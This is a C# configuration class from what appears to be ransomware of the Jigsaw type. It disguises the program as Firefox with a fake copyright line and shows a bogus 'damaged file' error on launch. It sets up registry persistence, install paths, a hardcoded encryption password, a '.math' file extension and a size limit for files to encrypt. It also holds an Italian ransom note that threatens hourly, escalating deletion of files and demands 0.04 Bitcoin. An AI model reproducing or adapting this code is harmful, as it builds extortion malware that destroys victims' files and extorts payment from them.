using System;
using System.IO;
using Main.Tools;

namespace Main;

internal static class Config
{
	internal enum StartModeType
	{
		Debug,
		ErrorMessage,
		NothingHappens,
		DeleteItself
	}

	internal const string AssemblyProdutAndTitle = "Firefox";

	internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";

	internal const string AssemblyVersion = "37.0.2.5583";

	internal const string EncryptionFileExtension = ".math";

	internal const int MaxFilesizeToEncryptInBytes = 10000000;

	internal const string EncryptionPassword = "OoIsAwwF32cICQoLDA0ODe==";

	internal static StartModeType StartMode;

	internal static string ErrorMessage;

	internal static string ErrorTitle;

	internal static Windows.StartupMethodType StartupMethod;

	internal static string TempExeRelativePath;

	internal static string TempExePath;

	internal static string FinalExeRelativePath;

	internal static string FinalExePath;

	internal static string WorkFolderRelativePath;

	internal static string WorkFolderPath;

	internal static bool OnlyRunAfterSysRestart;

	internal static DateTime ActiveAfterDateTime;

	internal static bool Activated;

	internal static int TimerActivateCheckerInterval;

	internal static string WelcomeMessage;

	internal static string TaskMessage;

	internal static double RansomBtc;

	static Config()
	{
		Activated = false;
		TimerActivateCheckerInterval = 6000;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		StartMode = StartModeType.ErrorMessage;
		ActiveAfterDateTime = new DateTime(2016, 1, 1);
		ErrorMessage = "Estensione non valida" + Environment.NewLine + "Il file è danneggiato";
		ErrorTitle = "File Danneggiato";
		StartupMethod = Windows.StartupMethodType.Registry;
		TempExeRelativePath = "Drpbx\\drpbx.exe";
		FinalExeRelativePath = "Frfx\\firefox.exe";
		FinalExePath = Path.Combine(folderPath, FinalExeRelativePath);
		TempExePath = Path.Combine(folderPath2, TempExeRelativePath);
		WorkFolderRelativePath = "System32Work\\";
		WorkFolderPath = Path.Combine(folderPath, WorkFolderRelativePath);
		if (!Directory.Exists(WorkFolderPath))
		{
			Directory.CreateDirectory(WorkFolderPath);
		}
		OnlyRunAfterSysRestart = false;
		WelcomeMessage = "Buongiorno voglio fare un gioco con te lascia che ti spieghi" + Environment.NewLine + "I tuoi files stanno per essere eliminati foto, video, documenti ecc..." + Environment.NewLine + "Ma non preoccuparti succederà solo se il pagamento non andrà a buon fine" + Environment.NewLine + "Comunque li ho già criptati in modo che tu non possa accedervi" + Environment.NewLine + Environment.NewLine + "Ogni ora ne selezionerò alcuni da eliminare permanentemente" + Environment.NewLine + "E nemmeno io potrò più accedervi." + Environment.NewLine + "Ti è familiare il concetto di crescita esponenziale? Ti spiego" + Environment.NewLine + "Inizierò lentamente e poi li eliminerò con tapidità" + Environment.NewLine + "Durante le prime 24 ore ne perderai pochi," + Environment.NewLine + "il secondo giorno poche centinaia, il terzo poche migliaia e così via" + Environment.NewLine + Environment.NewLine + "Se spegni il computer o provi a chiudermi io ritornerò" + Environment.NewLine + "E ti cancellerò 1000 files come punizione." + Environment.NewLine + "Si ha capito bene, ritornerò, sinceramente sono l'unico che" + Environment.NewLine + "è capace di decriptare i suoi files per lei" + Environment.NewLine + Environment.NewLine + "       Ora, divertiamoci insieme con questo gioco      ";
		RansomBtc = 0.04;
		TaskMessage = "Please, send at least " + RansomBtc + " worth of Bitcoin here:";
	}
}
